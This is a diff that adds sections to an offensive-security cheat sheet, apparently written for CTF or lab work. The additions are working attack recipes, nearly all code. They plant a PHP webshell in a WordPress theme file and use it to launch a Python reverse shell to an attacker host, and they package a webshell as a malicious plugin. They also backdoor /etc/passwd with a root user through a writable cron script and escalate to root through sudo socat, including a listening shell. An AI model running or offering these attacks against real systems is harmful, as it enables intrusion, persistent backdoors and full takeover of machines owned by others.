@@ -84,6 +84,39 @@ wpscan --url http://<target> --api-token $WPTOKEN -e u,vp,vt,dbe
 wpscan --url http://<target> -U users.txt -P /usr/share/wordlists/rockyou.txt
 ```
 
+### WordPress — Theme Editor RCE
+
+When you have WordPress admin credentials, inject a PHP webshell directly into a theme file via Appearance → Theme Editor → select any inactive theme → open `404.php`. Add the webshell at the top, save, then trigger it:
+
+```bash
+# Confirm RCE (the theme's 404.php now executes commands)
+curl -sk "http://<target>/wp-content/themes/<theme>/404.php?cmd=id"
+
+# Deliver reverse shell via the webshell
+curl -sk "http://<target>/wp-content/themes/<theme>/404.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+```
+
+### WordPress — Malicious Plugin Upload RCE
+
+Package a PHP webshell as a WordPress plugin and upload it via Plugins → Add New → Upload Plugin. WordPress installs and activates it without signature checks.
+
+```bash
+# Build the plugin package
+mkdir -p webshell-plugin
+cat > webshell-plugin/webshell.php <<'EOF'
+<?php
+/**
+ * Plugin Name: Webshell
+ * Version: 1.0
+ */
+system($_GET['cmd']);
+EOF
+zip -j webshell-plugin.zip webshell-plugin/webshell.php
+
+# After upload and activation, trigger RCE
+curl -sk "http://<target>/wp-content/plugins/webshell-plugin/webshell.php?cmd=id"
+```
+
 ### cadaver — WebDAV
 
 ```bash
@@ -243,6 +276,30 @@ echo '<string>' | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 
 # URL-encode a payload string (before passing via curl ?cmd= parameter)
 python3 -c "import urllib.parse; print(urllib.parse.quote('<command>'))"
+```
+
+### Vigenère Cipher — CTF Decode
+
+HTML comments sometimes hide Vigenère-encoded credentials. The key is usually left alongside the ciphertext as a second comment or hint. Decode it with an online tool or Python:
+
+```python
+# Vigenère decode — Python one-liner
+python3 -c "
+cipher = 'Dvc W@iyur@123'
+key    = 'KeepGoing'
+k      = [c for c in key.lower() if c.isalpha()]
+ki     = 0
+out    = []
+for c in cipher:
+    if c.isalpha():
+        shift = ord(k[ki % len(k)]) - ord('a')
+        base  = ord('A') if c.isupper() else ord('a')
+        out.append(chr((ord(c) - base - shift) % 26 + base))
+        ki += 1
+    else:
+        out.append(c)
+print(''.join(out))
+"
 ```
 
 ---
@@ -774,6 +831,24 @@ watch -n 1 ls -lah /bin/bash
 /bin/bash -p
 ```
 
+### /etc/passwd Backdoor — Root User via Cron Script
+
+If the world-writable cron script runs as root, overwrite it to append a backdoor root user to `/etc/passwd`. Generate an MD5-crypt hash first, then craft the entry:
+
+```bash
+# Generate the hash on your attacker machine
+openssl passwd -1 -salt xyz password
+# example output: $1$xyz$WS9wRpHkHCTG4UNfuHJxN/
+
+# Overwrite the world-writable cron script with the backdoor payload
+# (single-quote the echo to prevent shell from expanding $1 prematurely)
+echo 'echo "backdoor:$1$xyz$WS9wRpHkHCTG4UNfuHJxN/:0:0:root:/root:/bin/bash" >> /etc/passwd' > /path/to/cron_script.sh
+
+# Wait up to 1 minute for cron to fire, then switch user
+su - backdoor   # password: password
+id              # uid=0(root)
+```
+
 ### Tar Wildcard Injection
 
 ```bash
@@ -821,6 +896,17 @@ ssh -i /tmp/id_ed25519 <user>@<target>
 
 ```bash
 sudo wget http://<LHOST>/passwd -O /etc/passwd
+```
+
+### sudo socat — Shell Escape (GTFOBins)
+
+If `socat` appears in `sudo -l` with `NOPASSWD`, use it to open a root shell directly:
+
+```bash
+sudo /usr/bin/socat stdin exec:/bin/sh
+# or, for a fully interactive PTY:
+sudo socat TCP-LISTEN:<LPORT>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
+socat FILE:$(tty),raw,echo=0 TCP:<target>:<LPORT>
 ```
 
 ### lxd / Docker Group
